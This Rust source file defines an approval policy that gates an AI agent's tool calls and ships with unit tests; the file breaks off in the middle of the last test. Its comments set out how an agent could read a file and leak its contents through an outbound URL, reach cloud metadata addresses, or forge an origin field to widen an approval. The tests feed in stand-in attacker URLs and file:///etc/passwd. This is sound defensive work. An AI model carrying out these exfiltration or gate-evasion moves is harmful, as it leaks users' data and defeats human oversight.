//! Approval policy: decide, before anything runs, whether a tool call needs a
//! person.
//!
//! Evaluated in the hub, never in the harness (`docs/SPEC.md` §6.0). Three
//! verdicts, ordered: deny beats ask beats allow. A permissive rule can never
//! widen a restrictive one, so adding an `allow` can only reduce prompts,
//! never safety.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Run it. Nobody is asked.
    Allow,
    /// Stop and ask a person. Carries the reason they will be shown.
    Ask(String),
    /// Refuse outright. No person is asked, because the answer is already no.
    Deny(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Action {
    Allow,
    /// Stop and ask the person who owns the session.
    ///
    /// `ask` is accepted as well, and is not a courtesy alias: the product uses
    /// both words for this and a person can only guess which one a given
    /// surface wants. `botroster run --approve ask`, `routine tick --approve ask`
    /// and the approval dialog all say ask; only the rules file said
    /// `require_approval`, and the README's own example said `ask` and was
    /// rejected by the parser that reads it. Writing the word the rest of the
    /// product taught you is not a mistake worth an error.
    ///
    /// `require_approval` stays canonical, so it is what serialises and what
    /// `permission ls` prints, and a file written either way reads back the
    /// same.
    #[serde(alias = "ask")]
    RequireApproval,
    Deny,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Rule {
    pub action: Action,
    /// Glob over the tool id: `fs.read`, `fs.*`, `*`.
    pub tool: String,
    /// Optional narrowing on one argument, e.g. `("path", "/etc/*")`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub when: Option<ArgMatch>,
    /// Shown to the approver. Write these as the reason a person would give.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ArgMatch {
    pub key: String,
    pub glob: String,
}

impl Rule {
    pub fn allow(tool: &str) -> Self {
        Self {
            action: Action::Allow,
            tool: tool.into(),
            when: None,
            reason: None,
        }
    }
    pub fn ask(tool: &str, reason: &str) -> Self {
        Self {
            action: Action::RequireApproval,
            tool: tool.into(),
            when: None,
            reason: Some(reason.into()),
        }
    }
    pub fn deny(tool: &str, reason: &str) -> Self {
        Self {
            action: Action::Deny,
            tool: tool.into(),
            when: None,
            reason: Some(reason.into()),
        }
    }
    pub fn when(mut self, key: &str, glob: &str) -> Self {
        self.when = Some(ArgMatch {
            key: key.into(),
            glob: glob.into(),
        });
        self
    }

    fn matches(&self, tool: &str, args: &Value) -> bool {
        if !glob_match(&self.tool, tool) {
            return false;
        }
        match &self.when {
            None => true,
            Some(m) => args
                .get(&m.key)
                .and_then(|v| v.as_str())
                .map(|v| glob_match(&m.glob, v))
                // A rule that narrows on an argument the call does not carry
                // does not match. Treating a missing argument as a match would
                // make `deny fs.write when path=/etc/*` fire on every write.
                .unwrap_or(false),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Policy {
    pub rules: Vec<Rule>,
    /// Verdict for a call no rule matches.
    pub fallback: Action,
    /// Tools the person approved with "always allow" for the lifetime of the session.
    ///
    /// Held separately from `rules` rather than appended to them, because ask
    /// outranks allow: an extra allow rule would never lift the gate it was
    /// meant to lift. A grant is checked after deny and before ask, which is
    /// the precedence a person means by "always allow": it overrides the
    /// prompt, never an outright refusal.
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    pub grants: BTreeSet<String>,
    /// Whether `browser.open` may reach a literal loopback, link-local, private
    /// or metadata address.
    ///
    /// Off by default and `skip_serializing_if` false, so a policy written by an
    /// older build reads back with the refusal in force: a stored policy must not
    /// silently gain a permission because it was deserialised.
    #[serde(default)]
    pub allow_private_browser_destinations: bool,
}

impl Default for Policy {
    /// The shipped default: reads are free, changes ask.
    ///
    /// Least privilege by default: start read-only, review the output, then
    /// widen intentionally. An agent that can silently write files and run
    /// shell commands on its first run is not a safe default.
    fn default() -> Self {
        Self {
            rules: vec![
                Rule::allow("fs.read"),
                Rule::allow("fs.list"),
                Rule::ask("fs.write", "writes a file into the workspace"),
                Rule::ask("shell.exec", "runs a shell command on the computer"),
                // Reading the web is browsing; *fetching* it is not, and the
                // difference is the whole content of this rule.
                //
                // `browser.open` issues an outbound request to a destination the
                // model chose, with model-chosen bytes in the path. That is a
                // write to somebody else's server wearing a GET, and it made
                // `fs.read` → `browser.open https://elsewhere/?q=<contents>` a
                // complete exfiltration chain needing no prompt at all. The old
                // comment here said "reading the web is browsing" and was true
                // of `browser.read`, one line below.
                //
                // Asking per call would make browsing unusable, so the answer is
                // scoped rather than repeated: approving an origin covers that
                // origin for the session, and nothing else. `browser.read` and
                // the rest stay free, because they describe a page the Bot is
                // already on and change nothing. Finding F-GT3.
                Rule::ask(
                    "browser.open",
                    "opens a URL, sending this computer's request to that origin",
                ),
                Rule::allow("browser.read"),
                Rule::allow("browser.links"),
                // Same class as `read`: it describes the page the Bot already
                // has open and changes nothing. It also has to be `allow` for
                // the acting tools to be usable at all — `click` and `fill`
                // are `ask`, and a snapshot that prompted would mean two
                // approvals per interaction, one of them for looking.
                Rule::allow("browser.snapshot"),
                Rule::allow("browser.screenshot"),
                // The live viewer's frame stream. Same risk class as a
                // screenshot (pixels of a page the agent already opened), and
                // prompting for each frame would make the viewer unusable
                // rather than safe.
                Rule::allow("browser.frame"),
                Rule::ask("browser.click", "clicks something on a live web page"),
                Rule::ask("browser.fill", "types into a form on a live web page"),
                // The viewer's input tools, which the guest also offers to a
                // Bot. Explicit rules rather than the fallback, so the
                // approval card says what will happen instead of "no rule
                // covers `browser.type`".
                Rule::ask("browser.click_at", "clicks a point on a live web page"),
                Rule::ask("browser.type", "types into a live web page"),
                Rule::ask("browser.key", "presses a key on a live web page"),
                // Scrolling reads further down a page the Bot already has
                // open. Same class as `browser.read` and the frame stream, and
                // prompting for each scroll would make reading a long page a
                // conversation about scrolling.
                Rule::allow("browser.scroll"),
                // Reading the roster is harmless; putting work in someone
                // else's queue is not.
                Rule::allow("bot.list"),
                Rule::ask("bot.send", "hands work to another Bot"),
                // Asking a person for a credential is not an action to
                // approve; it is the approval. Every other rule here gates
                // something that happens to the world once permitted;
                // `secret.request` only puts a refusable question in front of
                // a person, naming both the credential and the Bot's reason
                // for wanting it. Falling to the `RequireApproval` fallback
                // would cost two prompts for one decision, the first strictly
                // less informative than the second.
                //
                // A rule, not a carve-out in the enforcement path, so an
                // operator who disagrees still wins: deny short-circuits and
                // ask outranks allow, held by
                // `an_operators_own_rule_still_governs_credential_requests`.
                // It is also visible in `botroster policy ls`, which an invisible
                // exemption would not be.
                Rule::allow("secret.request"),
            ],
            fallback: Action::RequireApproval,
            grants: BTreeSet::new(),
            allow_private_browser_destinations: private_browser_destinations_allowed(),
        }
    }
}

/// Whether `BOTROSTER_ALLOW_PRIVATE_BROWSER_OPEN` asks for the refusal to be
/// lifted.
///
/// An environment variable rather than a policy file entry, so that turning it on
/// is visible in the process's own configuration: `env` in a `ps`, the
/// orchestrator's spec, the run command. Off unless it is exactly `1`, because a
/// knob that treats "true", "yes" and any non-empty string as consent is a knob
/// that gets set by accident.
fn private_browser_destinations_allowed() -> bool {
    match std::env::var("BOTROSTER_ALLOW_PRIVATE_BROWSER_OPEN") {
        Ok(v) => v == "1",
        Err(_) => false,
    }
}

impl Policy {
    /// The shipped default with the `browser.open` private-address refusal
    /// lifted, for a Bot developing against a server on its own machine.
    ///
    /// Named rather than left as a boolean someone sets, because the difference
    /// between "this build refuses loopback" and "this build does not" is not the
    /// kind of thing that should be visible only in a struct literal. What it does
    /// *not* lift is the approval: an allowed private destination still costs one
    /// prompt, as every other `browser.open` does.
    pub fn allowing_private_browser_destinations() -> Self {
        Self {
            allow_private_browser_destinations: true,
            ..Self::default()
        }
    }

    /// A policy that approves everything. For non-interactive runs where the
    /// operator has accepted the risk explicitly; never a default.
    pub fn allow_all() -> Self {
        Self {
            rules: vec![Rule::allow("*")],
            fallback: Action::Allow,
            grants: BTreeSet::new(),
            // A blanket allow is already an explicit acceptance of risk, and it
            // is a test and non-interactive-run construct. Leaving the refusal
            // on would mean `allow_all` still denied something, and a policy
            // called "allow everything" that does not is a trap for whoever
            // reaches for it next.
            allow_private_browser_destinations: true,
        }
    }

    /// Precedence, in order: the private-address refusal, then deny, then a
    /// session grant, then ask, then allow, then the fallback.
    pub fn evaluate(&self, tool: &str, args: &Value) -> Verdict {
        // Ahead of every rule and every grant, and for the same reason a rule
        // deny short-circuits: this is a refusal, not a prompt. A person asked to
        // approve a fetch of the cloud metadata service is being offered a
        // decision they cannot make from the card, and "allow for the session"
        // would then let every later fetch of that address through with nobody
        // asked. It is checked here rather than in the guest because the guest is
        // the thing being gated: a check the guest evaluates is a check the
        // guest can delete.
        if !self.allow_private_browser_destinations && tool == "browser.open" {
            if let Some(url) = args.get("url").and_then(|v| v.as_str()) {
                if let Some(why) = private_destination_reason(url) {
                    return Verdict::Deny(format!(
                        "`browser.open` refuses {why}; a Bot developing against a server on \
                         its own machine can set BOTROSTER_ALLOW_PRIVATE_BROWSER_OPEN=1, and \
                         the fetch will still ask"
                    ));
                }
            }
        }

        let mut ask: Option<String> = None;
        let mut allowed = false;

        for r in self.rules.iter().filter(|r| r.matches(tool, args)) {
            match r.action {
                // Deny short-circuits: nothing later can rescue it, including
                // a grant. "Always allow" must never override an outright ban.
                Action::Deny => {
                    return Verdict::Deny(
                        r.reason
                            .clone()
                            .unwrap_or_else(|| format!("`{tool}` is denied by policy")),
                    )
                }
                Action::RequireApproval => {
                    ask.get_or_insert_with(|| {
                        r.reason
                            .clone()
                            .unwrap_or_else(|| format!("`{tool}` requires approval"))
                    });
                }
                Action::Allow => allowed = true,
            }
        }

        // The person already answered "always" for this tool earlier in the session.
        if self.grants.contains(tool) {
            return Verdict::Allow;
        }

        // Or "always, at this origin": one prompt per site rather than one per
        // page, without turning the answer into a pass for the whole web. The
        // origin comes from the call's own `url`, so this is checked against
        // what will actually be opened. No `url`, or a `url` with no
        // derivable origin, means no grant matches and the `ask` below stands.
        if let Some(url) = args.get("url").and_then(|v| v.as_str()) {
            if let Some(origin) = url_origin(url) {
                if self.grants.contains(&origin_grant_key(tool, &origin)) {
                    return Verdict::Allow;
                }
            }
        }

        // Ask outranks allow, so a broad `allow *` cannot silently swallow a
        // narrow `require approval`.
        if let Some(reason) = ask {
            return Verdict::Ask(reason);
        }
        if allowed {
            return Verdict::Allow;
        }
        match self.fallback {
            Action::Allow => Verdict::Allow,
            Action::RequireApproval => {
                Verdict::Ask(format!("no rule covers `{tool}`; asking to be safe"))
            }
            Action::Deny => Verdict::Deny(format!("no rule covers `{tool}`")),
        }
    }

    /// Record an "always allow" answer for the rest of the session.
    ///
    /// Session-scoped and in-memory by design: a decision made in a hurry to
    /// unblock one task should not silently become permanent policy.
    pub fn allow_from_now_on(&mut self, tool: &str) {
        self.grants.insert(tool.to_owned());
    }

    /// Record an "allow for the rest of this session" answer scoped to one
    /// origin, so approving a site does not ask again on every page of it.
    ///
    /// A grant keyed on the tool alone is the wrong shape for a tool whose
    /// argument *is* the destination: approving `browser.open` once would then
    /// mean approving every host on the web for the rest of the session, which
    /// is the same hole the gate was added to close, reached by answering the
    /// prompt rather than by ignoring it.
    pub fn allow_origin_from_now_on(&mut self, tool: &str, origin: &str) {
        // Normalise on the way in as well as on the way out, so a caller that
        // passes `https://example.com:443` and one that passes
        // `https://example.com` cannot produce two grants for one destination.
        let key = match url_origin(origin) {
            Some(normalized) => origin_grant_key(tool, &normalized),
            None => origin_grant_key(tool, origin),
        };
        self.grants.insert(key);
    }

    /// Record "allow for the rest of this session" for one call, scoped as
    /// narrowly as that call allows.
    ///
    /// This is what the hub calls when a person answers "always". The
    /// granularity is the policy's decision, not the caller's, for one reason:
    /// the caller is the code that was wrong last time. When `browser.open`'s
    /// "always" was recorded against the tool, answering the prompt once granted
    /// every host on the web for the rest of the session — the same hole the
    /// prompt was added to close, reached by answering it. Deciding here means
    /// the rule cannot be forgotten at a second call site.
    ///
    /// A call with no `url`, or a `url` from which no origin can be derived,
    /// gets the tool-wide grant it always got.
    pub fn allow_from_now_on_for(&mut self, tool: &str, args: &Value) {
        match args
            .get("url")
            .and_then(|v| v.as_str())
            .and_then(url_origin)
        {
            Some(origin) => self.allow_origin_from_now_on(tool, &origin),
            None => self.allow_from_now_on(tool),
        }
    }
}

/// The origin a `url` argument points at, as `scheme://host[:port]`.
///
/// Computed **here**, from the string the hub is about to forward to the guest,
/// and never read out of the call. The obvious alternative — having the agent
/// pass an `origin` field for the policy to match on — makes the gate forgeable
/// by the thing it gates: `url` to anywhere, `origin` to somewhere already
/// approved. `a_caller_supplied_origin_cannot_widen_the_gate` is that attack.
///
/// `None` for anything that is not http(s), including a string that does not
/// parse. Failing closed is the point: an origin the hub cannot establish is an
/// origin no grant may cover, so a malformed URL skips nothing.
/// Why this URL names an address that is not on the public internet, if it does.
///
/// **This sees names, not resolved addresses.** It refuses a destination whose
/// *host* is a literal address in a private range, and it cannot tell you
/// anything about a hostname that resolves into one. Two gaps follow, and both
/// are real:
///
/// * A name that resolves to loopback or a metadata address passes. RFC 6761
///   reserves `localhost` and `*.localhost` for exactly that, which is why they
///   are refused by name here, but nothing stops `internal.example` from
///   resolving to `10.0.0.1`.
/// * A redirect is invisible. A public origin that answers `302` to
///   `http://169.254.169.254/` is followed, and this never sees the second URL.
///
/// Both need an egress filter in front of the browser, which is a different and
/// larger piece of work than a policy check. The code here must not imply
/// otherwise, which is why the limit is stated here rather than only in the
/// README.
///
/// Parsed, never string-matched, and deliberately so: the spellings that matter
/// are exactly the ones a string test gets wrong. `2130706433`, `0x7f.1` and
/// `017700000001` are all `127.0.0.1`, `http://allowed.example@127.0.0.1/`
/// looks like a request to `allowed.example` and is not, and `localhost.` is a
/// *different name* from `localhost` to the parser. The `url` crate has already
/// resolved the numeric forms and dropped the userinfo by the time its `Host`
/// enum reaches us, so this reads a decided value rather than re-deciding.
///
/// Non-http(s) schemes and unparseable URLs return `None`, which means "keep
/// asking" rather than "refuse". This code cannot distinguish a malformed URL
/// from a scheme it has not been taught, and a refusal carrying a misleading
/// reason is worse than a prompt.
fn private_destination_reason(url: &str) -> Option<&'static str> {
    let parsed = url::Url::parse(url).ok()?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return None;
    }
    match parsed.host()? {
        url::Host::Ipv4(a) => ipv4_private_reason(a),
        url::Host::Ipv6(a) => match a.to_ipv4_mapped() {
            // `[::ffff:127.0.0.1]` is `127.0.0.1` written by a dual-stack client.
            // Without this the v4 ranges are invisible to a v6-looking URL, which
            // is the same hole reached by asking nicely.
            Some(v4) => ipv4_private_reason(v4),
            None => ipv6_private_reason(a),
        },
        url::Host::Domain(d) => {
            // The parser lowercases the host, but a trailing dot survives: it
            // parses as the name `localhost.`, which resolves exactly like
            // `localhost`. One dot is stripped and only one, because
            // `localhost..` is not a thing anyone means.
            let name = d.strip_suffix('.').unwrap_or(d);
            if name.eq_ignore_ascii_case("localhost")
                || name.to_ascii_lowercase().ends_with(".localhost")
            {
                // RFC 6761 reserves these for loopback, so a name that looks
                // public and resolves to this machine is not a public address.
                Some("a loopback name (`localhost` or `*.localhost`)")
            } else {
                None
            }
        }
    }
}

fn ipv4_private_reason(a: std::net::Ipv4Addr) -> Option<&'static str> {
    // Order is only for the message. The four are disjoint: 127/8 is neither
    // link-local nor private, 169.254/16 is link-local and not private, and
    // `is_private` is exactly 10/8, 172.16/12 and 192.168/16.
    if a.is_loopback() {
        return Some("a loopback address (127.0.0.0/8)");
    }
    if a.is_link_local() {
        return Some(
            "a link-local address (169.254.0.0/16), which is the range the cloud \
             metadata service answers on at 169.254.169.254",
        );
    }
    if a.is_unspecified() {
        return Some("the unspecified address 0.0.0.0");
    }
    if a.is_private() {
        return Some("a private address (10/8, 172.16/12 or 192.168/16)");
    }
    None
}

fn ipv6_private_reason(a: std::net::Ipv6Addr) -> Option<&'static str> {
    if a.is_loopback() {
        return Some("the IPv6 loopback address ::1");
    }
    if a.is_unspecified() {
        return Some("the unspecified address ::");
    }
    let s = a.segments();
    // Written out rather than `is_unique_local` / `is_unicast_link_local`, which
    // are still unstable, and this crate promises MSRV 1.89.
    if (s[0] & 0xffc0) == 0xfe80 {
        return Some("an IPv6 link-local address (fe80::/10)");
    }
    // fc00::/7 is fc00 through fdff, so this also covers fd00:ec2::254, the IPv6
    // cloud metadata endpoint. No special case for it.
    if (s[0] & 0xfe00) == 0xfc00 {
        return Some("a unique-local address (fc00::/7)");
    }
    None
}

fn url_origin(url: &str) -> Option<String> {
    let parsed = url::Url::parse(url).ok()?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return None;
    }
    // `host_str` excludes any userinfo, so `https://u:p@elsewhere.test/` cannot
    // borrow an approval granted to a host that merely appears in the string.
    let host = parsed.host_str()?;
    // The `url` crate lowercases the host and drops a default port, so
    // `https://EXAMPLE.com:443` and `https://example.com` agree on their own.
    Some(match parsed.port() {
        Some(port) => format!("{}://{host}:{port}", parsed.scheme()),
        None => format!("{}://{host}", parsed.scheme()),
    })
}

/// Key for a grant that applies to one origin of one tool.
///
/// A space separates the two halves. Tool ids are `[a-z0-9_.-]` and an origin
/// contains no spaces, so the split is unambiguous, and the key stays readable
/// in `permission ls` and in a session's serialised policy — a grant set
/// someone cannot read is a grant set nobody can audit.
fn origin_grant_key(tool: &str, origin: &str) -> String {
    format!("{tool} {origin}")
}

/// Glob with a single `*` wildcard, matching any run of characters.
///
/// Intentionally not a regex: policy rules are security-relevant and are read
/// far more often than they are written, so the matching must be obvious to
/// someone skimming them.
fn glob_match(pattern: &str, value: &str) -> bool {
    if pattern == "*" {
        return true;
    }
    let Some((head, tail)) = pattern.split_once('*') else {
        return pattern == value;
    };
    if !value.starts_with(head) {
        return false;
    }
    let rest = &value[head.len()..];
    // Multiple wildcards: recurse on the remainder.
    if tail.contains('*') {
        return (0..=rest.len()).any(|i| glob_match(tail, &rest[i..]));
    }
    rest.len() >= tail.len() && rest.ends_with(tail)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn globs_match_literally_and_with_a_wildcard() {
        assert!(glob_match("fs.read", "fs.read"));
        assert!(!glob_match("fs.read", "fs.write"));
        assert!(glob_match("fs.*", "fs.write"));
        assert!(!glob_match("fs.*", "shell.exec"));
        assert!(glob_match("*", "anything"));
        assert!(glob_match("*.exec", "shell.exec"));
        assert!(glob_match("fs.*e", "fs.write"));
        assert!(!glob_match("fs.*e", "fs.read"));
    }

    #[test]
    fn the_default_policy_allows_reads_and_asks_before_changes() {
        let p = Policy::default();
        assert_eq!(p.evaluate("fs.read", &json!({})), Verdict::Allow);
        assert_eq!(p.evaluate("fs.list", &json!({})), Verdict::Allow);
        assert!(matches!(
            p.evaluate("fs.write", &json!({})),
            Verdict::Ask(_)
        ));
        assert!(matches!(
            p.evaluate("shell.exec", &json!({})),
            Verdict::Ask(_)
        ));
    }

    #[test]
    fn an_unknown_tool_asks_rather_than_running() {
        let p = Policy::default();
        // A tool with no rule is the case where guessing is worst.
        assert!(matches!(
            p.evaluate("email.send", &json!({})),
            Verdict::Ask(_)
        ));
    }

    #[test]
    fn deny_beats_ask_and_allow_regardless_of_order() {
        let p = Policy {
            rules: vec![
                Rule::allow("shell.exec"),
                Rule::ask("shell.exec", "asks"),
                Rule::deny("shell.exec", "no shell on this account"),
            ],
            fallback: Action::Allow,
            grants: BTreeSet::new(),
            allow_private_browser_destinations: false,
        };
        match p.evaluate("shell.exec", &json!({})) {
            Verdict::Deny(r) => assert_eq!(r, "no shell on this account"),
            other => panic!("deny must win, got {other:?}"),
        }

        // ...and the same with the deny listed first.
        let p2 = Policy {
            rules: vec![Rule::deny("shell.exec", "no"), Rule::allow("shell.exec")],
            fallback: Action::Allow,
            grants: BTreeSet::new(),
            allow_private_browser_destinations: false,
        };
        assert!(matches!(
            p2.evaluate("shell.exec", &json!({})),
            Verdict::Deny(_)
        ));
    }

    #[test]
    fn a_broad_allow_cannot_swallow_a_narrow_require() {
        // The common misconfiguration: `allow *` added to stop prompts must
        // not silently disable every approval gate.
        let p = Policy {
            rules: vec![Rule::allow("*"), Rule::ask("shell.exec", "still asks")],
            fallback: Action::Allow,
            grants: BTreeSet::new(),
            allow_private_browser_destinations: false,
        };
        assert!(matches!(
            p.evaluate("shell.exec", &json!({})),
            Verdict::Ask(_)
        ));
        assert_eq!(p.evaluate("fs.read", &json!({})), Verdict::Allow);
    }

    #[test]
    fn argument_narrowing_applies_only_when_the_argument_is_present() {
        let p = Policy {
            rules: vec![
                Rule::allow("fs.write"),
                Rule::deny("fs.write", "not into /etc").when("path", "/etc/*"),
            ],
            fallback: Action::Deny,
            grants: BTreeSet::new(),
            allow_private_browser_destinations: false,
        };
        assert!(matches!(
            p.evaluate("fs.write", &json!({"path": "/etc/passwd"})),
            Verdict::Deny(_)
        ));
        assert_eq!(
            p.evaluate("fs.write", &json!({"path": "notes.md"})),
            Verdict::Allow
        );
        // No `path` at all: the narrowed rule must not fire.
        assert_eq!(p.evaluate("fs.write", &json!({})), Verdict::Allow);
    }

    #[test]
    fn allow_all_is_available_but_explicit() {
        let p = Policy::allow_all();
        assert_eq!(p.evaluate("shell.exec", &json!({})), Verdict::Allow);
        assert_eq!(p.evaluate("whatever.new", &json!({})), Verdict::Allow);
    }

    #[test]
    fn always_allow_actually_lifts_the_gate() {
        // Pushing an allow rule would not work, because ask outranks allow.
        // A grant has to be its own tier.
        let mut p = Policy::default();
        assert!(matches!(
            p.evaluate("fs.write", &json!({})),
            Verdict::Ask(_)
        ));
        p.allow_from_now_on("fs.write");
        assert_eq!(p.evaluate("fs.write", &json!({})), Verdict::Allow);
        // Other tools are unaffected.
        assert!(matches!(
            p.evaluate("shell.exec", &json!({})),
            Verdict::Ask(_)
        ));
    }

    #[test]
    fn a_grant_never_overrides_an_outright_deny() {
        let mut p = Policy {
            rules: vec![Rule::deny("shell.exec", "no shell on this account")],
            fallback: Action::Allow,
            grants: BTreeSet::new(),
            allow_private_browser_destinations: false,
        };
        p.allow_from_now_on("shell.exec");
        assert!(matches!(
            p.evaluate("shell.exec", &json!({})),
            Verdict::Deny(_)
        ));
    }

    #[test]
    fn grants_are_idempotent() {
        let mut p = Policy::default();
        p.allow_from_now_on("fs.write");
        p.allow_from_now_on("fs.write");
        assert_eq!(p.grants.len(), 1);
    }

    // ── T2-3: `browser.open` is an exfiltration primitive, not browsing ─────────
    //
    // `browser.open` takes any http(s) URL and the default policy allowed it
    // outright, under the comment "Reading the web is browsing". That is true of
    // `browser.read` and false of `open`: a GET with model-chosen bytes in the
    // path is a write to the other end. The chain
    // `fs.read` → `browser.open https://elsewhere/?q=<contents>` needed no
    // approval at all. Finding F-GT3 in `.claude/product-review/reports/`.

    #[test]
    fn opening_a_url_asks_because_it_is_a_request_not_a_read() {
        let p = Policy::default();
        assert!(
            matches!(
                p.evaluate("browser.open", &json!({ "url": "https://example.com/a" })),
                Verdict::Ask(_)
            ),
            "an unprompted outbound GET is the cheapest exfiltration channel in the \
             product; the default must not permit it"
        );
        // The reason is shown to the person, so it has to say what will happen.
        let reason = match p.evaluate("browser.open", &json!({ "url": "https://example.com/" })) {
            Verdict::Ask(r) => r,
            other => panic!("expected Ask, got {other:?}"),
        };
        assert!(
            reason.contains("origin") || reason.contains("web"),
            "the approver is shown {reason:?}, which does not say what is being asked"
        );
    }

    #[test]
    fn reading_the_page_is_still_free() {
        // The gate is on `open` alone. If this regressed, the fix would be
        // "ask about everything", which is not a fix.
        let p = Policy::default();
        for tool in [
            "browser.read",
            "browser.links",
            "browser.snapshot",
            "browser.scroll",
        ] {
            assert_eq!(
                p.evaluate(tool, &json!({})),
                Verdict::Allow,
                "{tool} describes a page the Bot already has open"
            );
        }
    }

    #[test]
    fn an_origin_grant_stops_the_repeat_prompt_and_widens_to_nothing_else() {
        let mut p = Policy::default();
        let here = json!({ "url": "https://example.com/one" });
        p.allow_origin_from_now_on("browser.open", "https://example.com");

        assert_eq!(
            p.evaluate("browser.open", &here),
            Verdict::Allow,
            "the person already said yes to this origin for the session"
        );
        // A different path on the same origin is the same decision.
        assert_eq!(
            p.evaluate(
                "browser.open",
                &json!({ "url": "https://example.com/two?x=1" })
            ),
            Verdict::Allow
        );
        // A different origin is a different decision, and this is the whole
        // point: a grant for one site must not become a grant for the web.
        assert!(
            matches!(
                p.evaluate(
                    "browser.open",
                    &json!({ "url": "https://elsewhere.example/x" })
                ),
                Verdict::Ask(_)
            ),
            "an origin grant widened past the origin the person approved"
        );
    }

    #[test]
    fn an_origin_grant_distinguishes_scheme_port_and_case() {
        let mut p = Policy::default();
        p.allow_origin_from_now_on("browser.open", "https://example.com");
        for url in [
            "http://example.com/",            // scheme
            "https://example.com:8443/",      // port
            "https://sub.example.com/",       // host
            "https://example.com.evil.test/", // suffix, not subdomain
        ] {
            assert!(
                matches!(
                    p.evaluate("browser.open", &json!({ "url": url })),
                    Verdict::Ask(_)
                ),
                "{url} shares a prefix with the approved origin but is a different \
                 destination, and must still ask"
            );
        }
        // Host case is not part of identity: DNS is case-insensitive and a model
        // that capitalises the host has not gone anywhere new.
        assert_eq!(
            p.evaluate("browser.open", &json!({ "url": "https://EXAMPLE.com/x" })),
            Verdict::Allow
        );
    }

    /// The origin is computed by the hub from the `url` it is about to forward,
    /// never read from the call.
    ///
    /// The tempting shortcut is to have the caller pass `origin` alongside `url`
    /// so the policy has something to match on. That would let the agent pick
    /// the string the gate reads: `url` to anywhere, `origin` to something
    /// already approved. The guest is untrusted and so is the agent; only the
    /// hub may decide what a call is asking for.
    #[test]
    fn a_caller_supplied_origin_cannot_widen_the_gate() {
        let mut p = Policy::default();
        p.allow_origin_from_now_on("browser.open", "https://example.com");
        assert!(
            matches!(
                p.evaluate(
                    "browser.open",
                    &json!({ "url": "https://attacker.test/steal", "origin": "https://example.com" })
                ),
                Verdict::Ask(_)
            ),
            "an `origin` argument in the call decided the verdict; the gate is \
             forgeable by the thing it gates"
        );
    }

    #[test]
    fn a_url_the_hub_cannot_parse_still_asks() {
        let mut p = Policy::default();
        p.allow_origin_from_now_on("browser.open", "https://example.com");
        // No origin can be derived, so no grant can match. Failing closed here is
        // the whole point: a malformed URL that skipped the gate would be a hole
        // shaped exactly like the one being closed.
        for bad in ["not a url", "", "javascript:alert(1)", "file:///etc/passwd"] {
            assert!(
                matches!(
                    p.evaluate("browser.open", &json!({ "url": bad })),
                    Verdict::Ask(_)
                ),
                "{bad:?} produced a verdict other than Ask"
            );
        }
    }

    #[test]
    fn a_deny_still_beats_an_origin_grant() {
        let mut p = Policy::default();
        p.allow_origin_from_now_on("browser.open", "https://example.com");
        p.rules
            .push(Rule::deny("browser.open", "no web from this Bot"));
        assert!(
            matches!(
                p.evaluate("browser.open", &json!({ "url": "https://example.com/" })),
                Verdict::Deny(_)
            ),
            "a grant overrode an outright ban"
        );
    }

    #[test]
    fn an_origin_grant_does_not_apply_to_another_tool() {
        let mut p = Policy::default();
        p.allow_origin_from_now_on("browser.open", "https://example.com");
        // `browser.click` is already `ask`; the point is that approving a
        // destination did not quietly approve acting on it.
        assert!(
            matches!(p.evaluate("browser.click", &json!({})), Verdict::Ask(_)),
            "an origin grant for browser.open reached browser.click"
        );
    }

    #[test]
    fn origin_grants_survive_a_policy_round_trip() {
        let mut p = Policy::default();
        p.allow_origin_from_now_on("browser.open", "https://example.com");
        let j = serde_json::to_value(&p).unwrap();
        let back: Policy = serde_json::from_value(j).unwrap();
        assert_eq!(
            back.evaluate("browser.open", &json!({ "url": "https://example.com/x" })),
            Verdict::Allow,
            "a session grant did not survive serialisation"
        );
    }

    /// "Always" is scoped by the call, not by the tool.
    ///
    /// This is the method the hub actually calls, and it had no unit test — the
    /// only thing covering it was a live test, so regressing it surfaced as an
    /// integration failure with a real browser in the path rather than as a
    /// one-line policy failure. Found by mutating this method back to its old
    /// tool-wide behaviour and noticing all 22 unit tests stayed green.
    #[test]
    fn always_is_scoped_by_the_call_and_falls_back_to_the_tool() {
        let mut scoped = Policy::default();
        scoped.allow_from_now_on_for(
            "browser.open",
            &json!({ "url": "https://example.com/deep/path?q=1" }),
        );
        assert_eq!(scoped.grants.len(), 1, "one answer, one grant");
        assert!(
            scoped
                .grants
                .iter()
                .all(|g| g.contains("https://example.com")),
            "the grant was not origin-scoped: {:?}",
            scoped.grants
        );
        assert!(
            matches!(
                scoped.evaluate("browser.open", &json!({ "url": "https://other.example/" })),
                Verdict::Ask(_)
            ),
            "an origin-scoped grant answered a different origin"
        );

        // A call with no url, or one no origin can be derived from, keeps the
        // tool-wide grant it has always had — every tool that is not a URL
        // fetcher is unaffected by any of this.
        for args in [
            json!({}),
            json!({ "url": "not a url" }),
            json!({ "url": 7 }),
        ] {
            let mut wide = Policy::default();
            wide.allow_from_now_on_for("shell.exec", &args);
            assert!(
                wide.grants.contains("shell.exec"),
                "a call with no derivable origin lost its tool-wide grant: {:?} for {args}",
                wide.grants
            );
        }
    }

    #[test]
    fn a_policy_round_trips_through_json() {
        let p = Policy::default();
        let j = serde_json::to_value(&p).unwrap();
        assert_eq!(j["rules"][0]["action"], "allow");
        assert_eq!(j["fallback"], "require_approval");
        assert_eq!(serde_json::from_value::<Policy>(j).unwrap(), p);
    }

    /// One decision, one prompt.
    ///
    /// If `secret.request` fell to the `RequireApproval` fallback, a person
    /// answering a credential request would answer twice: an approval card
    /// asking whether the Bot may ask, then the box naming the credential and
    /// the reason. The first question is strictly less informative than the
    /// second.
    #[test]
    fn asking_a_person_for_a_credential_is_not_itself_gated() {
        assert_eq!(
            Policy::default().evaluate("secret.request", &json!({"name":"linear-token"})),
            Verdict::Allow,
